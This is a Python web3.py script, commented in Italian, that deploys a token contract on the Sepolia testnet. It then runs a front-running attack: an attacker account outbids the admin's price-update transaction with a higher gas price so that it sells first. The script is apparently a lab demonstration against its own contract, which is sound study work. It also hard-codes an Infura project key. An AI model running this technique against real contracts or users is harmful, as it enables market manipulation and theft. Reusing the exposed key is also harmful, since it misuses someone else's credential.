from web3 import Web3
from solcx import compile_standard, install_solc
from dotenv import load_dotenv
import json, os, time, csv
from datetime import datetime

# Impostazioni iniziali
load_dotenv()
PRIVATE_KEY_ADMIN = os.getenv("PRIVATE_KEY_ADMIN")
PRIVATE_KEY_ATTACKER = os.getenv("PRIVATE_KEY_ATTACKER")
ACCOUNT_ADMIN = "0x0C695d7087e72f736FD84B31BC3335532Da23bb0"
ACCOUNT_ATTACKER = "0xDf3ba104c293020453c8Ebb4fb84CE226b6546E5"
CONTRACT_NAME = "BuySellTokens"

w3 = Web3(Web3.HTTPProvider("https://sepolia.infura.io/v3/854261bb8677458b9201b8062c8b74ad"))
chain_id = 11155111  # Sepolia
install_solc("0.8.0")

# Funzione per compilare il contratto
def compile_contract():
    with open(f"{CONTRACT_NAME}.sol", "r") as file:
        source_code = file.read()

    compiled = compile_standard({
        "language": "Solidity",
        "sources": {
            f"{CONTRACT_NAME}.sol": {
                "content": source_code
            }
        },
        "settings": {
            "outputSelection": {
                "*": {
                    "*": ["abi", "metadata", "evm.bytecode", "evm.sourceMap"]
                }
            }
        }
    }, solc_version="0.8.0")

    abi = compiled["contracts"][f"{CONTRACT_NAME}.sol"][f"{CONTRACT_NAME}"]["abi"]
    bytecode = compiled["contracts"][f"{CONTRACT_NAME}.sol"][f"{CONTRACT_NAME}"]["evm"]["bytecode"]["object"]
    return abi, bytecode

# Funzione per il deploy del contratto
def deploy_contract(w3, abi, bytecode, sender, private_key, value_ether=0):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(sender)

    tx = contract.constructor().build_transaction({
        "from": sender,
        "nonce": nonce,
        "chainId": chain_id,
        "gas": 3000000,
        "gasPrice": w3.to_wei(0.5, "gwei"),
        "value": w3.to_wei(value_ether, "ether")
    })

    signed = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print("📤 Deploy in corso...")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("✅ Contratto deployato all'indirizzo:", receipt.contractAddress)
    return w3.eth.contract(address=receipt.contractAddress, abi=abi), receipt.contractAddress

# L'admin modifica il prezzo dei token
def admin_update_price(contract, new_price):
    nonce = w3.eth.get_transaction_count(ACCOUNT_ADMIN)
    tx = contract.functions.updatePrice(new_price).build_transaction({
        "from": ACCOUNT_ADMIN,
        "nonce": nonce,
        "gas": 100000,
        "gasPrice": w3.to_wei(0.5, "gwei"), 
    })
    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY_ADMIN)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"⚠️ Admin aggiorna il prezzo a {new_price}: {tx_hash.hex()}")
    return tx_hash.hex()

# L'attaccante acquista token
def attacker_buy(contract):
    nonce = w3.eth.get_transaction_count(ACCOUNT_ATTACKER)
    tx = contract.functions.buy().build_transaction({
        "from": ACCOUNT_ATTACKER,
        "value": w3.to_wei(0.001, "ether"),
        "nonce": nonce,
        "gas": 100000,
        "gasPrice": w3.to_wei(0.5, "gwei"),
    })
    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY_ATTACKER)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print("TX di acquisto inviata:", tx_hash.hex())
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("TX di acquisto confermata")
    return tx_hash.hex(), receipt

# L'attaccante vende token
def attacker_sell(contract, token_amount):
    nonce = w3.eth.get_transaction_count(ACCOUNT_ATTACKER)
    tx = contract.functions.sell(token_amount).build_transaction({
        "from": ACCOUNT_ATTACKER,
        "nonce": nonce,
        "gas": 100000,
        "gasPrice": w3.to_wei(10, "gwei"),  # Gas price più alto
    })
    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY_ATTACKER)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print("TX di vendita inviata:", tx_hash.hex())
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("TX di vendita confermata")
    return tx_hash.hex(), receipt

# Funzione per il calcolo del guadagno netto
def calcolo_guadagno_netto(buy_receipt, sell_receipt, balance_before, balance_after):
    buy_gas_cost = buy_receipt.gasUsed * buy_receipt.effectiveGasPrice
    sell_gas_cost = sell_receipt.gasUsed * sell_receipt.effectiveGasPrice

    return (balance_after - balance_before) + buy_gas_cost + sell_gas_cost


if __name__ == "__main__":
    abi, bytecode = compile_contract()
    contract, contract_address = deploy_contract(w3, abi, bytecode, ACCOUNT_ADMIN, PRIVATE_KEY_ADMIN, value_ether=0.00001)

    attacker_balance_before = w3.eth.get_balance(ACCOUNT_ATTACKER)
    # print(f"Il balance iniziale dell'attaccante è: {attacker_balance_before} wei")

    buy_tx, buy_receipt = attacker_buy(contract)  # L'attaccante acquista inizialmente dei token
    num_tokens = contract.functions.balance(ACCOUNT_ATTACKER).call()
    print(f"Token acquistati: {num_tokens}")
    
    admin_update_price(contract, 500)  # L'admin modifica il prezzo dei token (in questo caso dimezzandolo)
    
    time.sleep(2)  # Simulazione: l'attaccante osserva in mempool la transazione dell'admin che abbassa il prezzo dei token.
    
    # L'attaccante, per non perdere denaro, vende i token prima che il prezzo venga aggiornato.
    # Usa un gasPrice più alto per cercare di far includere la sua transazione prima di quella dell'admin.
    sell_tx, sell_receipt = attacker_sell(contract, num_tokens)

    attacker_balance_after = w3.eth.get_balance(ACCOUNT_ATTACKER)
    # print(f"Il balance finale dell'attaccante è: {attacker_balance_after} wei")

    # Calcolo del guadagno netto. Se il guadagno netto è >= 0, significa che l'attaccante è riuscito a vendere prima del cambio prezzo.
    # Nel mio esempio: se guadagno == 0 allora l'attaccante ha "vinto" perché è riuscito a vendere 
    # i token allo stesso prezzo con cui li aveva comprati.
    guadagno_netto = calcolo_guadagno_netto(buy_receipt, sell_receipt, attacker_balance_before, attacker_balance_after)
    
    if guadagno_netto >= 0:
        print("✅ L'attaccante ha venduto prima del nuovo prezzo: FRONT-RUN AVVENUTO")
        print("\t- Guadagno netto:", guadagno_netto, "wei")
    else:
        print("❌ L'attaccante ha venduto dopo il nuovo prezzo: FRONT-RUN FALLITO")
        print("\t- Perdita netta:", guadagno_netto, "wei")

